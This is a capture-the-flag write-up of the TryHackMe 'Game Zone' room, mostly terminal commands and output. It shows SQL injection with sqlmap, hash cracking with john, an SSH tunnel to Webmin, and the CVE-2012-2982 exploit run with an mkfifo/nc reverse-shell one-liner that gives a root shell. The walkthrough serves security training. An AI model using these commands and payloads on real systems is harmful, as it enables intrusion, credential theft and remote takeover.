---
layout: page
title: Game Zone
description: SQLMap hash - SSH.
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/gamezone/logo.jpeg" title="THM Game Zone Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/gamezone">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Let's hop on the highway to the game zone.  Hopefully.  Here we go.

First step, as usual, is running the nmap to identify the services.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.221.104
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 16:17 AEDT
Nmap scan report for 10.10.221.104
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Game Zone
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   8.47 ms   10.4.0.1
2   ... 3
4   264.47 ms 10.10.221.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.68 seconds
```
{% endraw %}

<br />
Check the Landing Page of the website.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/gamezone/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
The character on the landing page is from a game series called Hitman.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/gamezone/agent47.png" title="Agent 47" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the payload indicated in the box description to bypass the login.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/gamezone/sqli.png" title="SQL Injection" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Make a note of were the redirect leads.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/gamezone/redirect.png" title="Redirect" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Turn the burp interceptor on to be able to catch requests.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/gamezone/intercept.png" title="Intercept" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try to run a search request and intercept the request in the Burp.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/gamezone/request.png" title="Search Request" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Save the request to a text file called request.txt.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ cat request.txt             
POST /portal.php HTTP/1.1
Host: 10.10.190.117
Content-Length: 15
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.190.117
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.190.117/portal.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=583dqa4lotuo9sise19b4edrh7
Connection: keep-alive

searchitem=test
```
{% endraw %}

<br />
Run sqlmap against the request that we just saved.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ sqlmap -r request.txt --dbms=mysql --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:27:35 /2025-02-26/

[17:27:35] [INFO] parsing HTTP request from 'request.txt'
[17:27:35] [INFO] testing connection to the target URL

<snip>

Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[17:29:30] [INFO] table 'db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.190.117/dump/db/users.csv'
[17:29:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.190.117'

[*] ending @ 17:29:30 /2025-02-26/
```
{% endraw %}

<br />
Create a file that contains the hash so we can feed it into a cracker.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ echo 'agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' > hash.txt
```
{% endraw %}

<br />
Use hash-identifier to try to identify the type of hash.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ hash-identifier                                                             
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
```
{% endraw %}

<br />
Run john the ripper to crack the hash.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 hash.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (agent47)     
1g 0:00:00:00 DONE (2025-02-26 17:34) 4.000g/s 11796Kp/s 11796Kc/s 11796KC/s vimivi..vainlove
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```
{% endraw %}

<br />
SSH into the machine using our newly found, fancy credentials.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ ssh agent47@10.10.190.117                
The authenticity of host '10.10.190.117 (10.10.190.117)' can't be established.
ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.190.117' (ED25519) to the list of known hosts.
agent47@10.10.190.117's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
agent47@gamezone:~$ cat user.txt
<redacted>
agent47@gamezone:~$ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:1e:8d:69:ac:fd  
          inet addr:10.10.190.117  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::1e:8dff:fe69:acfd/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:987 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1075 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:152885 (152.8 KB)  TX bytes:300738 (300.7 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:2016 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2016 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:174164 (174.1 KB)  TX bytes:174164 (174.1 KB)
```
{% endraw %}

<br />
Run ss -tulpn to get a list of the ports that are listening.

{% raw %}
```bash
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q                                                                      Local Address:Port                                                                                     Peer Address:Port              
udp    UNCONN     0      0                                                                                       *:50119                                                                                               *:*                  
udp    UNCONN     0      0                                                                                       *:68                                                                                                  *:*                  
udp    UNCONN     0      0                                                                                       *:10000                                                                                               *:*                  
tcp    LISTEN     0      80                                                                              127.0.0.1:3306                                                                                                *:*                  
tcp    LISTEN     0      128                                                                                     *:10000                                                                                               *:*                  
tcp    LISTEN     0      128                                                                                     *:22                                                                                                  *:*                  
tcp    LISTEN     0      128                                                                                    :::80                                                                                                 :::*                  
tcp    LISTEN     0      128                                                                                    :::22                                                                                                 :::*
```
{% endraw %}

<br />
Create a local ssh tunnel that forwards port 10000 trough the SSH tunnel so we can view the website.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ ssh -L 10000:localhost:10000 agent47@10.10.190.117
agent47@10.10.190.117's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Wed Feb 26 00:35:45 2025 from 10.4.119.29
agent47@gamezone:~$
```
{% endraw %}

<br />
Check the website in the web browser using localhost and the 10000 port.  The internal website traffic will get forwarded through the local SSH tunnel.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/gamezone/10000.png" title="10000" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the agent47 credential to login to webmin so we can get the version.  We will need it to look-up and exploit.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/gamezone/webmin.png" title="Webmin" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look-up in Exploit-DB for our version of Webmin and find an authenticated exploit.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/gamezone/exploitdb.png" title="Exploit-DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/50809">https://www.exploit-db.com/exploits/50809</a>

<br />
Download the exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ wget https://www.exploit-db.com/raw/50809 -O exploit.py                               
--2025-02-26 18:12:04--  https://www.exploit-db.com/raw/50809
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7042 (6.9K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   6.88K  --.-KB/s    in 0.004s  

2025-02-26 18:12:06 (1.54 MB/s) - ‘exploit.py’ saved [7042/7042]






┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ curl https://raw.githubusercontent.com/JohnHammond/CVE-2012-2982/refs/heads/master/CVE-2012-2982.py -o CVE-2012-2982.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3897  100  3897    0     0   6873      0 --:--:-- --:--:-- --:--:--  6873
```
{% endraw %}

<br />
Since the box called for metasploit.  Give it a whirl.  I couldn't get it.  I gave up since we have the exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ msfconsole -q
msf6 > search webmin 1.580

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/webmin/edit_html_fileaccess

msf6 > use 
Usage: use <name|term|index>

Interact with a module by name or search term/index.
If a module name is not found, it will be treated as a search term.
An index from the previous search results can be selected if desired.

Examples:
  use exploit/windows/smb/ms17_010_eternalblue

  use eternalblue
  use <name|index>

  search eternalblue
  use <name|index>

msf6 > use exploit/unix/webapp/webmin_show_cgi_exec
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME                   yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts localhost
rhosts => localhost
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set USERNAME agent47
USERNAME => agent47
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
PASSWORD => videogamer124
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit
[*] Exploiting target 127.0.0.1
[-] Exploit failed: A payload has not been selected.
[*] Exploiting target ::1
[-] Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload linux/x86/shell_reverse_tcp
[-] The value specified for payload is not valid.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload linux/x86/shell/reverse_tcp
[-] The value specified for payload is not valid.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/linux/http/x86/read_file
[-] The value specified for payload is not valid.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit
[*] Exploiting target 127.0.0.1
[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
[*] Exploiting target ::1
[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost tun0
lhost => tun0
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost tun0
lhost => tun0
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP handler on 10.4.119.29:4444 
[*] Attempting to login...
[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=127.0.0.1:10000 state=error: record layer failure
[*] Exploiting target ::1
[*] Started reverse TCP handler on 10.4.119.29:4444 
[*] Attempting to login...
[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=[::1]:10000 state=error: record layer failure
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set ssl false
[!] Changing the SSL option's value may require changing RPORT!
ssl => false
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP handler on 10.4.119.29:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Exploiting target ::1
[*] Started reverse TCP handler on 10.4.119.29:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Exploit completed, but no session was created.
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Use revshells to generate a payload.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/gamezone/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Execute the python script.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ python3 CVE-2012-2982.py -t 127.0.0.1 -p 10000 -U agent47 -P videogamer124 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.119.29 443 >/tmp/f'
[+] targeting host 127.0.0.1 on port 10000
[+] successfully logged in with user 'agent47' and pw 'videogamer124'
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/gamezone]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.190.117] 54152
bash: cannot set terminal process group (1239): Inappropriate ioctl for device
bash: no job control in this shell
root@gamezone:/usr/share/webmin/file/#
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
root@gamezone:/usr/share/webmin/file/# cat /root/root.txt
cat /root/root.txt
<redacted>
root@gamezone:/usr/share/webmin/file/# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:1e:8d:69:ac:fd brd ff:ff:ff:ff:ff:ff
    inet 10.10.190.117/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::1e:8dff:fe69:acfd/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
And with that we smashed the game zone.  Thanks for reading along.  See you in the next one.
